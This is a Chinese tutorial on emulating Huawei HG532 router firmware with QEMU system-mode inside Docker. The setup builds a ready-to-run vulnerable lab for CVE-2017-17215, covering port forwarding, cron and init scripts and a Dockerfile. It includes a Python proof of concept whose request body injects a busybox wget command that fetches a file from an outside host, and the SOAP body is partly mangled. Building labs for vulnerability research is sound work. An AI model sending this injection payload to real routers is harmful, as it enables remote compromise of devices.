# 基于Docker的固件模拟

## 概述

目前的设备模拟都需要用户人工操作，没有一个直接可用的方案，难度大成本高耗时长。而且在各大漏洞靶场中都没有集成，如：Vulfocus 开源靶场，等。本文主要讲述如何在 `Docker` 中搭建 `Qemu` 进行 `system-mode` 模式的固件模拟，实现易于分发开箱即用的硬件模拟环境。要是有需完善地方，请读者留言共同促进改善之。

## 背景

由于工作内容是物联网安全方向，通常需要购买设备进行分析，但是目前多数的设备漏洞分析只需要有固件，然后将相关程序运行即可。目前网络上通常使用 `Qemu` 进行固件模拟，其他的就是 `Qemu` 和其他环境功能 （如：`nvram` ）的包装器如：`firmadyne`、`Firmware Analysis Toolkit`、`ARM-X` 固件仿真框架等。

上述列举的固件模拟工具，都需要用户安装好以后，再传输固件文件系统进行模拟固件服务运行。但是，通常固件模拟总有一些小细节的错误导致失败，而且类似固件模拟成功的文章作者有可能会忽略一些细致点，导致用户找不出问题点，模拟失败。因此一直在想，要是能够将模拟成功的固件环境打包成镜像，用户获取镜像后直接运行镜像就可以获取到固件漏洞点，直接省略了繁杂的固件搭建过程。

要实现这种“开箱即用”，直接想到的便是 `Docker`，它作为可直接打包其中的应用以及依赖包到一个可移植的容器，完全符合这种需求。网上查了查，现有的 `Docker` 中集成 `Qemu` 进行的固件模拟仅仅是利用 `user-mode` 模式（可执行二进制文件仿真，即开启固件中的单一服务）进行模拟应用运行，很多的服务的依赖包需要在`system-mode` 模式（固件全局仿真）下才能运行成功。

## 搭建过程

## 初步设想需解决点

根据通常 Docker 搭建Web等应用漏洞靶场的思路，即在启动 Docker 后直接访问漏洞点就可以像真正环境中一样利用。推理到固件靶场：

`Docker` 中需具备：模拟固件的框架，能够外部访问漏洞点，固件文件系统内部能访问外网（也就是漏洞能实际利用了），这就造成了：网络上已经有了 `Docker`镜像进行 `user-mode` 模式的固件模拟，但是没有 `system-mode` 模式，可能就是因为涉及到 `Qemu` 中的端口转发出来及网络等因素。

* 需要解决：
  * `Qemu` 中模拟漏洞时，如果漏洞是通过端口进行利用的，怎样将端口转发到 `Docker`
  * `Qemu` 能访问外网
  * `Qemu` 中的服务怎么随着 `Docker` 启动而启动，即：像 Web类的靶场，直接 `Docker` 启动就可以将漏洞环境运行起来

## 搭建过程划分及流程框架图

**搭建过程分为如下几步**

* MIPS 框架搭建--实现外网访问--端口映射
* `Qemu` 服务随 `Docker` 启动而启动
* （额外： `Qemu` 同步实时更新 `Docker` 中的文件）

**本文模拟的环境案例**

* `HG532` ，`CVE-2017-17215`，**知识储备**章节有写漏洞信息及利用脚本
* 漏洞产生点于组件服务端口 37215 ，从数据包中获取部分信息来进行代码执行
* HG532 固件文件系统类型是 mips 32位的，且格式为大端 MSB。
* 固件下载地址：[https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar](https://link.zhihu.com/?target=https%3A//ia601506.us.archive.org/22/items/RouterHG532e/router%2520HG532e.rar)
* PoC 内容如下：

```python
import requests 
headers = { 
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669" 
    } 
data = '''
    http://schemas.xm lsoap.org/soap/envelope/
    " s:encodingStyle="
    http://schemas.xm
    lsoap.org/soap/encoding/">;/bin/busybox wget -g 1.1.1.1 -l /tmp/.f;HUAWEIUPNP 
     ''' 
requests.post('http://x.x.x.x:37215/ctrlt/DeviceUpgrade_1', headers=headers, data=data)
```

**逻辑框架** Docker - Qemu - system-mode 模式的固件模拟流程图

![](<../../.gitbook/assets/image (622).png>)

## 0x01 MIPS 框架搭建--实现外网访问--端口映射

* `Docker version 19.03.2` 中 `Ubuntu 18.04.4` 系统 ，安装 `qemu-system-mips`\
  `apt-get update && apt-get install -y qemu -system-mips && apt-get clean`
* `Qemu` 使用的基础框架：[https://people.debian.org/\~aurel32/qemu/mips/](https://link.zhihu.com/?target=https%3A//people.debian.org/~aurel32/qemu/mips/)
* 此处映射了 `Qemu` 中的两个端口22、37215\
  qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian\_wheezy\_mips\_standard.qcow2 -append "root=/dev/sda1 rw console=tty0" -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5535-:22,hostfwd=tcp::37215-:37215 -nographic

**某些固件服务修改网络配置**

将固件文件系统传入 `Qemu` 模拟环境中，尝试运行其中的 `mic` 服务，会发现在终端运行的 `mic` 进程退不出来，也就是无法掌控终端了；

在 `mic` 服务启动的过程中发现网络有修改，也就是意味着ip被修改了，那么转发的端口不能使用了。

**使用定时任务修改网络配置**

定时任务实现：修改 `/etc/crontab` 文件，必须要按照格式填写

```
按照/etc/crontab中的格式填写如下内容：
* * * * * sh /root/changeip.sh


nano changeip.sh，内容如下：

#!/bin/sh

service networking restart
ifup eth0
```

## 0x02 固件文件系统的服务自启

解决问题： `Qemu` 服务随 `Docker` 启动而启动

启动项加入过程：

```
路径：/etc/init.d/micc_open
权限：chmod 777 /etc/init.d/micc_open
加入自启项目：update-rc.d mic_open defaults 99

mic_open内容如下：

#!/bin/sh
### BEGIN INIT INFO
# Provides:          aaa.com
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Desc ription: mic service
# Desc ription:       mic service daemon
### END INIT INFO
chroot /root/squashfs-root/ mic
```

## 0x03 `Qemu` 同步实时更新 `Docker` 中的文件

有个小需求需要用户攻陷设备后获取 flag，也就是需要 `Qemu` 同步实时更新 `Docker` 中的 `/tmp/flag` 文件

解决：只要将 `/tmp` 目录挂载到 `Qemu` 中就行，使用 `fat:/tmp`

```
Qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 rw console=tty0" -hdb fat:/tmp -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5535-:22,hostfwd=tcp::37215-:37215 -nographic
```

`Qemu` 中执行，加入自启动项实现：

```
fdisk -l
mount /dev/sdb1 /tmp
```

## 知识储备

## 储备1: **端口转发**

`Qemu` 中说明文档：[https://wiki.archlinux.org/index.php?title= Qemu](https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php%3Ftitle%3DQemu)

![](<../../.gitbook/assets/image (455).png>)

## 储备2: **Qemu联网方式**

`Qemu` 中说明文档：[https://wiki.archlinux.org/index.php?title= Qemu](https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php%3Ftitle%3DQemu)

![](<../../.gitbook/assets/image (629).png>)

## 储备3: Qemu 挂载 Docker中的目录

`Qemu` 中说明文档：[https://wiki.archlinux.org/index.php?title= Qemu](https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php%3Ftitle%3DQemu)

**挂载主机分区**

![](<../../.gitbook/assets/image (611).png>)

## 储备4: Qemu的必备知识点

一篇文章有介绍 `Qemu` ，如下截图其中的一部分内容，详细可参考：

[https://nosec.org/home/detail/4213.html](https://link.zhihu.com/?target=https%3A//nosec.org/home/detail/4213.html)

![](https://pic4.zhimg.com/80/v2-056fca45551ad76eb7a4b2eef7dbe2df_720w.jpg)

## 储备5: 本文涉及到的Docker知识点

* 网络配置使用的命令，如：`ip router`
* 在自动运行 `Docker` 中 `Qemu` 中固件文件系统中的服务成功之前，想过要是 `Docker` 能保存当前的运行状态多方便，研究如下：\
  `Docker save`与`Docker export`\
  save 镜像，不是当前运行的而是原本的，当前运行的镜像不会保存。 export 容器，会保存，但是只是文件。
* `Docker` 镜像修改保存新镜像，`docker commit`从容器中创建一个新镜像<br>
  * -a :提交的镜像作者
  * -m :提交时的说明文字

docker commit \[OPTIONS] CONTAINER \[REPOSITORY\[:TAG]] docker commit -m="qemu-system-mips\_HG532" -a="m2ayill" 553c8ce8df01 mips\_huawei\_hg532\_success\_fat\_flag:v2

* `Dockerfile` 的编写<br>
  * `FROM`：先从本地查找镜像，若无，再从网上获取镜像\
    `FROM mips_huawei_hg532_success:latest`
  * `MAINTAINER`：描述镜像的创建者\
    `MAINTAINER m2ayill`
  * `ADD`：在执行 <源文件> 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 <目标路径>，描述镜像的创建者，先从本地查找镜像\
    `ADD <源路径1> <目标路径>`
  * `RUN`：执行后面的命令行命令\
    `RUN <命令行命令>`
  * `ENTRYPOINT`：类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖\
    `ENTRYPOINT ["/start.sh"]`\
    在创建镜像时，本人使用了RUN，直接在创建过程中运行了命令 mic 导致直接卡顿，创建不了了，看完本文内容就知道。
  * `EXPOSE`：声明端口\
    `EXPOSE <端口1>`

```
Dockerfile内容如下：

FROM    mips_huawei_hg532_success:latest        #从本地获取镜像
MAINTAINER    m2ayill        #镜像的创建者
ADD    ./start.sh /            #<源文件> ：./start.sh 复制并到 <目标路径>：/
RUN    chmod 777 /start.sh

ENTRYPOINT    ["/start.sh"]        #类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖

EXPOSE 37215                #声明端口        


start.sh文件内容
启动 Qemu 的命令
```

## 搭建中的踩坑点

## 0x01\_1 端口转发

搭建过程中虽然进行端口转发使用的是 hostfwd ，但是初步想法有过：要实现外部访问 `Docker` 的端口， `Docker` 内部得有端口能访问，所以有两种方法实现（其实也是根据 `Qemu` 中的网络模式划分的）：

* 将桥接或虚拟网卡 `tap` 的端口转发到 `Docker` 内部端口
* `Qemu` 直接将端口映射到 `Docker` 内部端口

根据**知识储备1**可知：`user网络模式` 可以实现端口转发到 `Docker` ，最主要的是可以访问外网，类似于 nat。

这里使用的是 `user网络模式` ，（ 有兴趣的人，:) 可以试试 tap ，`Qemu` 说明文档中有写转发过程）

## 0x01\_2 hostfwd的转发端口

* 刚开始尝试时，ssh转发到 `Docker` 的 5535 端口成功，但是 37215 死活不行，而且本文使用的案例是我使用的第二个案例，第一个案例是雄迈的 telnet 后门漏洞，其中 9527 端口也是转不出来，

1. 设想，是不是 `hostfwd` 只能转发一个端口\
   案例推翻假设：尝试了 `cc8160`（第三个案例）启动的是 80 端口和 22 端口，两个端口都能使用
2. 后来一步步回想做了哪些操作：

​ 5535 是在没有运行`mic` 之前，连接成功；\
​ 在运行 `mic` 后，5535 端口也不能使用了；\
​ **查看 `mic` 服务启动过程，发现 `mic` 服务在运行时将网络环境修改了**

* `hostfwd`转发的端口是只要 `Qemu` 内部有相应的端口，就可以通过`hostfwd`设定的端口转发出来，也就是说，内部的服务可以在 `Qemu` 运行后启动：

1. 设想，ssh 端口是开机自启的，当初还以为只能是系统内部已经启动的端口才能够转出来，而运行 `Qemu` 后自行启动的端口无法转出\
   案例推翻假设：将 ssh 端口关闭后， `Qemu` 转发到 `Docker` 的端口无法使用 ssh 登录了，重新启动 ssh 服务，又可以使用了

* 与搭建无关的：<br>
  * 通过 `Qemu` 转发到 `Docker` 的端口，5535、37215等，其实本地是在类似监听的状态，也就是说 telnet 5535 等端口，都是属于通的状态，无法通过 telnet 来判断是否 `Qemu` 内部的服务已经启动

## 0x02 “定时任务”历程

**解决办法设想过如下：**

* 放入后台，将终端释放出来，没有 `nohub` 命令，只能通过 `&` 或者`ctrl+z`<br>
  * 使用`ubuntu`虚拟机+ `Qemu` 实现的 `ctrl+z` 放入后台，bg 的结果是 doing，&结果总是 stopped
  * 使用 `Docker` + `Qemu` ，两种方法总是 stopped
* 使用 ssh 登录后的终端运行 `mic` 服务

​ 案例推翻：使用 ssh 运行的 `mic` 服务，由于运行中断，导致运行不起来

**定时任务编写过程：**

* `/var/log/cron`
* `crontab -e`，`crontab`查看内容添加上了
* `crontab file`，`crontab` 查看内容添加上了
* 权限问题
* 重启服务`/etc/init.d/cron restart`
* 无意中全局搜索 `crontab` ，`/etc/crontab` 符合平常设定定时任务的格式类型，当时脑子也呆了，下意识的直接按照文件原本的格式填写了，（第二天重新设置定时任务，死活不成功，重新走了一下流程，最终发现的原因是，`/etc/crontab` 填写的内容是复制过来的，没有按照原文格式写:( ）

## 0x03 模拟攻击

到此为止，定时任务设定好，先实现： `Qemu` 服务手动运行起来利用转发端口到 `Docker` ，外部能够漏洞利用成功，手动运行`mic` 服务，结果：**访问 ssh 成功、poc 攻击不成**

**分析原因（ 因为过程繁琐没有在Docker中测试，使用单独的Ubuntu 虚拟机+ Qemu ）**：

* 查看 poc 在 `mic` 中的运行过程，尝试修改命令为 `date` ，执行成功
* ssh 登录，执行 wget 有报错信息，什么都不说了，得按照格式来：`wget -g ip -l 保存路径`（-P 端口，-r 路径）

## 0x04 “服务自启”历程

手动运行固件服务成功后，就要解决问题： `Qemu` 服务随 `Docker` 启动而启动

当时想的很复杂， `Qemu` 中的固件文件系统中的服务加入启动项，涉及到两个系统，怎么实现

走了一下流程：

* `chroot /root/squashfs-root/ bin/sh` ，进入固件shell中
* `mic`，运行服务

尝试

`chroot /root/squashfs-root/ mic`，可以运行

那就方便处理了，只要将`chroot /root/squashfs-root/ mic`在启动 `Qemu` 时，服务同时运行起来就行，两种方法：

* 加入启动项
* 定时任务（想到的第一个办法就是定时任务，没有尝试，原因如下，其实挺后悔的，要不然早弄完了：）<br>
  * 设想，定时任务几乎都是随着mic服务运行后执行的，也就是在 `Qemu` 登录后，没有尝试登录前看看能不能执行；（为什么&#x8BF4;**`Qemu` 登录**，在下面有写）
  * 验证：在后面通过自启项目 `mic` 运行后，会在 `Qemu` 启动的过程中卡住，但是定时任务还是执行了，说明在未登录之前定时任务是可以执行的）

启动脚本第一版

```
mic_open内容如下：

#!/bin/sh

chroot /root/squashfs-root/ mic
```

尝试：

* `/etc/profile.d/mic_open`，只能&#x5728;**`Qemu` 登录用户**后启动；
* `/etc/init.d/mic_open`、 rd0-6 目录下都添加，不行；
* 将脚本转成服务，加入自启项目；
* 使用命令加入自启项目，`update-rc.d mic_open defaults 99`，发现启动脚本有问题，根据报错信息，有了如下的第二版脚本，再次使用 `update-rc.d mic_open defaults 99` ，加入自启项目成功。\
  mic\_open内容如下： #!/bin/sh ### BEGIN INIT INFO # Provides: [http://aaa.com](https://link.zhihu.com/?target=http%3A//aaa.com) # Required-Start: $local\_fs $network # Required-Stop: $local\_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Desc ription: mic service # Desc ription: mic service daemon ### END INIT INFO chroot /root/squashfs-root/ mic

## 0x05 实现“外网访问”历程

起初不知道 user模式可直接访问外网，而且 ping 执行过不能 ping 通，而且平常使用的是 tap

然后弯路开始了，其实一般都是使用 tap ，这种方法是好的，估计可以执行，在搭建 `Qemu` 框架就把tap设置好，然后可以访问外网，也能访问 `Docker` 网络，然后进行 `Docker` 内部的端口转发（使用 tap 不能用 hostfwd ）

环境：基于（完成 `Qemu` 框架+定时任务修改网络+自启动服务）的 `Docker` 中

方式：使用的是通过 br 给 tap 设置外网访问

弯路1: `Docker` 禁用eth0，这网络就访问不了了， `Docker` 中好多没有安装，很不方便（`dhclient br0`，没有 `dhclient` 命令），想着br设置一下就行了，就仿照 eth0 的设置成了静态，不行，

```
apt-get install isc-dhcp-client
apt-get install iputils-ping
```

解决：网上搜了一会儿，用了 `ip router`，仿照正常的eth0设置，通过 `ip router add` 添加 br

```
ip route
ip route add default via 172.17.0.1 dev br0
ifconfig br0 172.17.0.2/16
```

弯路2: 设置好了tap0，使用tap0启动 `Qemu` ，平常需要登录进 `Qemu` 修改下网络才可以使用，结果由于自启服务.`mic` ，在 `Qemu` 启动过程中直接卡顿了，ssh 也不知道 ip 不能登录

```
ifconfig eth0 down
brctl addbr br0
brctl addif br0 eth0
brctl stp br0 off
brctl setfd br0 1
brctl sethello br0 1
ifconfig br0 0.0.0.0 promisc up
ifconfig eth0 0.0.0.0 promisc up
```

解决：网上搜了：`-net tap` 与 `-netdi v user`，才了解到：`user 网络模式` ，可以联网是类似 `nat` 不能通过 `ping`命令访问外网。

也就是无形当中，网络 已经是好的，可以访问外网。

到目前为止， `Docker` 实现固件模拟漏洞环境成功。

## 未完待续

目前已将该 `Docker` 的固件漏洞环境镜像上传到`Vulfocus` ：[https://hub.docker.com/r/vulfocus/hg532-cve-2017-17215](https://link.zhihu.com/?target=https%3A//hub.docker.com/r/vulfocus/hg532-cve-2017-17215)，直接拉取镜像可启动固件漏洞环境，启动 `Qemu` 过程需要 4-5 分钟。希望读者阅读完本文，能将更多的环境集成到 `Vulfocus` 。

## 拓展

本文使用案例的是 mips 框架，同样是适用于其他环境如：ARM、i386 等。拓展开来，Docker目前不能搭建 Windows 漏洞环境，有这种需求的可以借助本文方法实现：Docker-Qemu-Windows。
